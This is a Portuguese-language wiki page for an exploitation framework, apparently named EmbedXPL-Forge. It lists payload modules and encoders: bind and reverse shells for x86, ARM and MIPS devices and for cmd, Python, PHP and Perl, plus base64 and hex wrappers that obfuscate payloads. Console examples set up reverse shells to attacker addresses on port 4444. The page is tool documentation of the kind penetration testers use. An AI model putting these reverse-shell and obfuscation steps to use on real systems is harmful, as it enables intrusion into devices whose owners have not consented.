# Payloads e Encoders

**Idioma:** Português (pt-BR). **English:** [../en-US/09-payloads-and-encoders.md](../en-US/09-payloads-and-encoders.md)

---

## Payloads

Existem **32** módulos de payload abrangendo as arquiteturas **x86**, **x64**, **armle**, **mipsbe**, **mipsle**, além das categorias **`cmd`**, **`perl`**, **`php`** e **`python`** para incorporar em exploits ou testes manuais.

### Categorias de arquitetura disponíveis

| Categoria | Descrição |
|-----------|-----------|
| `payloads/x86/` | Shellcodes para processadores x86 de 32 bits |
| `payloads/x64/` | Shellcodes para processadores x86-64 de 64 bits |
| `payloads/armle/` | Shellcodes ARM little-endian (dispositivos IoT ARM) |
| `payloads/armbe/` | Shellcodes ARM big-endian |
| `payloads/mipsle/` | Shellcodes MIPS little-endian (roteadores MIPS) |
| `payloads/mipsbe/` | Shellcodes MIPS big-endian |
| `payloads/cmd/` | Payloads de linha de comando (shell one-liners) |
| `payloads/python/` | Reverse/bind shells em Python 3 |
| `payloads/php/` | Payloads em PHP (webshells, reverse shells) |
| `payloads/perl/` | Payloads em Perl |

### Tipos de payload por arquitetura

| Tipo | Descrição |
|------|-----------|
| `bind_tcp` | Abre uma porta TCP no alvo, aguarda conexão do atacante |
| `bind_udp` | Abre uma porta UDP no alvo |
| `reverse_tcp` | Conecta de volta ao atacante via TCP |
| `reverse_udp` | Conecta de volta ao atacante via UDP |

### Exemplo de uso

```text
EmbedXPL-Forge > use payloads/cmd/bind_tcp
EmbedXPL-Forge (bind_tcp) > show options
EmbedXPL-Forge (bind_tcp) > run
```

```text
EmbedXPL-Forge > use payloads/python/reverse_tcp
EmbedXPL-Forge (python/reverse_tcp) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
EmbedXPL-Forge (python/reverse_tcp) > set lport 4444
[+] lport => 4444
EmbedXPL-Forge (python/reverse_tcp) > run
```

```text
EmbedXPL-Forge > use payloads/armle/reverse_tcp
EmbedXPL-Forge (armle/reverse_tcp) > show options
EmbedXPL-Forge (armle/reverse_tcp) > set lhost 192.168.1.50
[+] lhost => 192.168.1.50
EmbedXPL-Forge (armle/reverse_tcp) > run
```

---

## Encoders

**13** módulos de encoder fornecem transformações em **Python**, **PHP** e **Perl** (incluindo variantes **base64** e **hex**) para ofuscar ou transportar bytes de payload.

### Módulos de encoder disponíveis

| Categoria | Encoder | Descrição |
|-----------|---------|-----------|
| `encoders/python/` | `base64` | Encapsula payload em exec Python base64.b64decode |
| `encoders/python/` | `hex` | Encapsula payload em decodificação de bytes hex Python |
| `encoders/php/` | `base64` | Encapsula payload em decode base64 PHP |
| `encoders/php/` | `hex` | Encapsula payload em decodificação hex PHP |
| `encoders/perl/` | `base64` | Encapsula payload em decode base64 Perl |
| `encoders/perl/` | `hex` | Encapsula payload em decodificação hex Perl |

### Uso de encoders com payloads

Para listar encoders compatíveis com um payload carregado:

```text
exf > use payloads/python/reverse_tcp
exf (python/reverse_tcp) > show encoders

┌────────────────────┬──────────────────────────────────┬────────────────────────────────────────┐
│ Encoder            │ Name                             │ Description                            │
├────────────────────┼──────────────────────────────────┼────────────────────────────────────────┤
│ encoders/python/base64 │ Python Base64 Encoder       │ Wrap payload in Python base64.b64decode│
│ encoders/python/hex    │ Python Hex Encoder          │ Wrap payload in Python hex bytes decode│
└────────────────────┴──────────────────────────────────┴────────────────────────────────────────┘
```

Para usar um encoder com um payload:

```text
exf > use payloads/php/reverse_tcp
exf (php/reverse_tcp) > set encoder encoders/php/base64
[+] encoder => encoders/php/base64
exf (php/reverse_tcp) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
exf (php/reverse_tcp) > run
```

---

[Hub da Wiki](../README.md)
